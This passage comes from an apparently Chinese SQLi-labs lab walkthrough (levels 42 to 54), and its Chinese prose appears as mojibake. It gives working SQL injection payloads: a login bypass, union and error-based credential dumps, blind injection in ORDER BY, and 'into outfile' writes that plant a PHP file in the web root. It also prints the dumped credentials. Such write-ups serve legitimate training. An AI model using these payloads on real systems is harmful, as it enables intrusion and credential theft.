class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>logged-in.php</code></li></ul><p>ç™»å½•æˆåŠŸï¼Œæä¾›ä¿®æ”¹å¯†ç çš„è¡¨å•</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mylogin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pass_change.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pass_change.php</code></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> æ²¡æœ‰ç™»å½•<span class="token punctuation">:</span>    é‡å®šå‘åˆ° index<span class="token operator">.</span>php<span class="token keyword">if</span> æäº¤äº†ä¿®æ”¹å¯†ç è¡¨å•<span class="token punctuation">:</span>    <span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token variable">$pass</span><span class="token operator">==</span><span class="token variable">$re_pass</span><span class="token punctuation">:</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€é¢˜æ¼æ´æ¯”è¾ƒå¤šï¼Œé¦–å…ˆ login.php ä¸­ password æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥è¿›è¡Œå¸¸è§„çš„æŠ¥é”™æ³¨å…¥ä»¥åŠç›²æ³¨ï¼ŒåŒæ—¶æœ¬èº«åˆæ”¯æŒå †å æŸ¥è¯¢ï¼Œæ‰€ä»¥ä¹Ÿæ”¯æŒå †å æ³¨å…¥ã€‚ pass_change.php update è¯­å¥å­˜åœ¨æ¼æ´ï¼Œå…¸å‹çš„äºŒæ¬¡æ³¨å…¥ï¼Œç±»ä¼¼äº Less-24ã€‚</p><p>ç»å…¸çš„<strong>ä¸‡èƒ½å¯†ç </strong>ç»•è¿‡ <code>1&#39; or 1#</code>:</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-42/login.php</span> <span class="token http-version property">HTTP/1.1</span></span>...login_user=admin&amp;login_password=1' or 1#&amp;mysubmit=Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºç™»å½•æˆåŠŸåè¿”å›ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥ç™»å½•äº† id ä¸º 1 çš„ Dumb ç”¨æˆ·ï¼š</p><p><img src="https://image.3001.net/images/20200517/15897218466276.png" alt="img"></p><p>å°è¯•<strong>è”åˆæŸ¥è¯¢</strong>:</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-42/login.php</span> <span class="token http-version property">HTTP/1.1</span></span>...login_user=admin&amp;login_password=1' union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3#&amp;mysubmit=Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æŠ¥é”™æ³¨å…¥</strong>ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">login_user&#x3D;admin&amp;login_password&#x3D;1&#39; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;mysubmit&#x3D;Login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒç†è¿™é‡Œä¹Ÿå¯ä»¥è¿›è¡Œç›²æ³¨å’Œå †å æŸ¥æ³¨å…¥ï¼Œ è¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>å’Œ Less-42 çš„åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œè¿™é‡Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·è€Œå·²ï¼Œä¸å†èµ˜è¿°ã€‚</p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>username=&#39;$username&#39;</code></td></tr></tbody></table><p>å’Œ Less-43 çš„åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œå› ä¸ºæ²¡æœ‰è¾“å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œæ‰€ä»¥è¿™é‡Œå°‘äº†æŠ¥é”™æ³¨å…¥çš„åˆ©ç”¨æ–¹å¼ã€‚</p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>ä¸ Less-43 é—­åˆæ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯è¿™é‡Œå°‘äº†æŠ¥é”™æ³¨å…¥çš„åˆ©ç”¨æ–¹æ³•ã€‚</p><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>ORDER BY $id</code></td></tr></tbody></table><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># GET æ–¹å¼è·å– sort å‚æ•°</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># ç›´æ¥å°† id å¸¦å…¥ SQL ä¸­</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users ORDER BY <span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> æŸ¥è¯¢æˆåŠŸï¼š    è¾“å‡ºæŸ¥è¯¢ä¿¡æ¯<span class="token keyword">else</span>ï¼š    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>order by ä¸åŒäº where åçš„æ³¨å…¥ç‚¹ï¼Œä¸èƒ½ä½¿ç”¨ union ç­‰è¿›è¡Œæ³¨å…¥ã€‚æ³¨å…¥æ–¹å¼ååˆ†çµæ´»ï¼Œä¸‹é¢åœ¨æœ¬å…³æ¥è¯¦ç»†è®²è§£ä¸€ä¸‹ã€‚</p><h3 id="éªŒè¯æ–¹å¼"><a href="#éªŒè¯æ–¹å¼" class="headerlink" title="éªŒè¯æ–¹å¼"></a>éªŒè¯æ–¹å¼</h3><ul><li><strong>å‡åºå’Œé™åºéªŒè¯</strong></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å‡åºæ’åº</span>?sort<span class="token operator">=</span><span class="token number">1</span> asc<span class="token comment"># é™åºæ’åº</span>?sort<span class="token operator">=</span><span class="token number">1</span> dasc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>rand() éªŒè¯</strong></li></ul><p>rand(ture) å’Œ rand(false) çš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(true)?sort&#x3D;rand(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªå¯ä»¥è½»æ˜“æ„é€ å‡ºä¸€ä¸ªå¸ƒå°”å’Œå»¶æ—¶ç±»å‹ç›²æ³¨çš„æµ‹è¯• payload</p><p>æ­¤å¤– rand() ç»“æœæ˜¯ä¸€ç›´éƒ½æ˜¯éšæœºçš„</p><pre class="line-numbers language-none"><code class="language-none">?sort&#x3D;rand()?sort&#x3D;1 and rand()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><strong>å»¶æ—¶éªŒè¯</strong></li></ul><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;sleep(1)?sort&#x3D;(sleep(1))?sort&#x3D;1 and sleep(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™ç§æ–¹å¼å‡å¯ä»¥å»¶æ—¶ï¼Œå»¶æ—¶çš„æ—¶é—´ä¸º (è¡Œæ•°*1) ç§’</p><h3 id="æŠ¥é”™æ³¨å…¥1-2"><a href="#æŠ¥é”™æ³¨å…¥1-2" class="headerlink" title="æŠ¥é”™æ³¨å…¥1"></a>æŠ¥é”™æ³¨å…¥1</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æŠ¥é”™æ³¨å…¥2-2"><a href="#æŠ¥é”™æ³¨å…¥2-2" class="headerlink" title="æŠ¥é”™æ³¨å…¥2"></a>æŠ¥é”™æ³¨å…¥2</h3><p>åˆ©ç”¨ procedure analyse å‚æ•°ï¼Œä¹Ÿå¯ä»¥æ‰§è¡ŒæŠ¥é”™æ³¨å…¥ã€‚</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(&#39;:&#39;,username,password)+FROM+users limit 0,1))),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="å¸ƒå°”ç›²æ³¨-2"><a href="#å¸ƒå°”ç›²æ³¨-2" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><p>æ•°æ®åº“ç¬¬ 1 ä½ä¸ºï¼šs</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="å»¶æ—¶ç›²æ³¨-2"><a href="#å»¶æ—¶ç›²æ³¨-2" class="headerlink" title="å»¶æ—¶ç›²æ³¨"></a>å»¶æ—¶ç›²æ³¨</h3><p>æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ¯çš„ ascii ç ä¸º 115ï¼Œå³`s</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p><strong>å°†æŸ¥è¯¢ç»“æœå¯¼å…¥åˆ°æ–‡ä»¶ä¸­</strong>ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/var/www/html/less46.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœå¯¼å…¥ä¸æˆåŠŸçš„è¯ï¼Œå¾ˆå¯èƒ½æ˜¯å› ä¸º Web ç›®å‰ MySQL æ²¡æœ‰è¯»å†™æƒé™é€ æˆçš„ã€‚</p><p>è®¿é—®éªŒè¯æ˜¯å¦æœ‰ä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8888/less46.txt<span class="token number">1</span>    Dumb    Dumb<span class="token number">2</span>    Angelina    I-kill-you<span class="token number">3</span>    Dummy    p@ssword<span class="token number">4</span>    secure    crappy<span class="token number">5</span>    stupid    stupidity<span class="token number">6</span>    superman    genious<span class="token number">7</span>    batman    mob<span class="token operator">!</span>le<span class="token number">8</span>    admin    admin<span class="token number">9</span>    admin1    admin1<span class="token number">10</span>    admin2    admin2<span class="token number">11</span>    admin3    admin3<span class="token number">12</span>    dhakkan    dumbo<span class="token number">14</span>    admin4    admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>åˆ©ç”¨å¯¼å‡ºæ–‡ä»¶ getshell</strong>ï¼š</p><p>æ³¨å…¥å¤©ä¹¦é‡Œé¢æä¾›äº† lines terminated by å§¿åŠ¿ç”¨äº order by çš„æƒ…å†µæ¥ getsgellï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1 into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;less46.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3c3f70687020706870696e666f28293b3f3e æ˜¯ <code>&lt;php phpinfo();&gt;</code> çš„åå…­è¿›åˆ¶ç¼–ç ã€‚</p><p>æ¥æŸ¥çœ‹ä¸‹å†™å…¥çš„æ–‡ä»¶å†…å®¹æ˜¯å•¥æ ·å­çš„ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /var/www/html/less46.php <span class="token number">1</span>    Dumb    Dumb<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">2</span>    Angelina    I-kill-you<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">3</span>    Dummy    p@ssword<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">4</span>    secure    crappy<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">5</span>    stupid    stupidity<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">6</span>    superman    genious<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">7</span>    batman    mob<span class="token operator">!</span>le<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">8</span>    admin    admin<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">9</span>    admin1    admin<span class="token operator"><span class="token file-descriptor important">1</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">10</span>    admin2    admin<span class="token operator"><span class="token file-descriptor important">2</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">11</span>    admin3    admin<span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">12</span>    dhakkan    dumbo<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">14</span>    admin4    admin<span class="token operator"><span class="token file-descriptor important">4</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æµè§ˆå™¨è®¿é—®æµ‹è¯•çœ‹çœ‹ï¼š</p><p><img src="https://image.3001.net/images/20200518/15897680165097.png" alt="img"></p><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>å’Œ Less-46 ç›¸æ¯”ï¼Œåˆ©ç”¨æ–¹å¼ä¸å˜ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼æ–¹å¼å˜åŒ–ï¼Œæ³¨å…¥çš„æ—¶å€™åªè¦æ­£å¸¸é—­åˆå³å¯ã€‚</p><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>ORDER BY $id</code></td></tr></tbody></table><p>å’Œ Less-46 ç›¸æ¯”å°‘äº†æŠ¥é”™æ³¨å…¥ï¼Œå¸ƒå°”ã€å»¶æ—¶ç›²æ³¨ä¾ç„¶å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œinto outfile ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œ ä¸å†è¿‡å¤šæ¼”ç¤ºäº†ã€‚</p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>å’Œ Less-47 ç›¸æ¯”å°‘äº†æŠ¥é”™æ³¨å…¥ï¼Œå¸ƒå°”ã€å»¶æ—¶ç›²æ³¨ä¾ç„¶å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œinto outfile ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œ ä¸å†è¿‡å¤šæ¼”ç¤ºäº†ã€‚</p><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>ORDER BY $id</code></td></tr></tbody></table><p>å’Œ Less-46 ç›¸æ¯”ï¼ŒæŸ¥è¯¢æ–¹å¼ç”± mysql_query å˜æˆäº† mysqli_multi_queryï¼Œå› æ­¤æ”¯æŒå †å æ³¨å…¥ï¼Œåœ¨æ³¨å…¥æ–¹é¢ä¼šæ›´åŠ çµæ´»ã€‚å †å æ³¨å…¥çš„è¯ è¿™é‡Œä¸å†æ¼”ç¤ºï¼Œè¯¦ç»†ç»†èŠ‚å¯ä»¥å‚è€ƒ Less-38 çš„å †å æ³¨å…¥çš„å§¿åŠ¿ã€‚</p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>å’Œ Less-50 ç›¸æ¯”åªæ˜¯æ‹¼æ¥æ–¹å¼å‘ç”Ÿäº†å˜åŒ–ï¼Œå®é™…æ³¨å…¥çš„æ—¶å€™åªéœ€åšä¸€ä¸‹å¯¹åº”çš„é—­åˆå³å¯ã€‚</p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>ORDER BY $id</code></td></tr></tbody></table><p>å’Œ Less-50 æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å°‘äº†æŠ¥é”™æ³¨å…¥çš„åˆ©ç”¨æ–¹å¼ã€‚</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥</td><td align="left"><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>å’Œ Less-51 æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å°‘äº†æŠ¥é”™æ³¨å…¥çš„åˆ©ç”¨æ–¹å¼ã€‚</p><h1 id="è¿›é˜¶æŒ‘æˆ˜-54-65-å…³"><a href="#è¿›é˜¶æŒ‘æˆ˜-54-65-å…³" class="headerlink" title="è¿›é˜¶æŒ‘æˆ˜ 54-65 å…³"></a>è¿›é˜¶æŒ‘æˆ˜ 54-65 å…³</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>ç®€å•æºç åˆ†æï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> reset<span class="token punctuation">:</span>    <span class="token comment"># æ ¹æ®æ—¶é—´æˆ³ç”Ÿæˆ cookie</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3600000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> cookie ä¸­æœ‰ challenge<span class="token punctuation">:</span>        <span class="token variable">$sessid</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># ç”Ÿæˆ cookie </span>        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">;</span>        <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token variable">$col</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"challenge"</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        è®¡æ•°å™¨ <span class="token operator">+</span> <span class="token number">1</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM security.users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> æœ‰æŸ¥è¯¢æˆåŠŸ<span class="token punctuation">:</span>        è¾“å‡ºæŸ¥è¯¢ä¿¡æ¯    <span class="token keyword">else</span>ï¼š        å•¥éƒ½ä¸è¾“å‡º<span class="token comment"># key è¢«åŒé‡è¿‡æ»¤äº†</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span 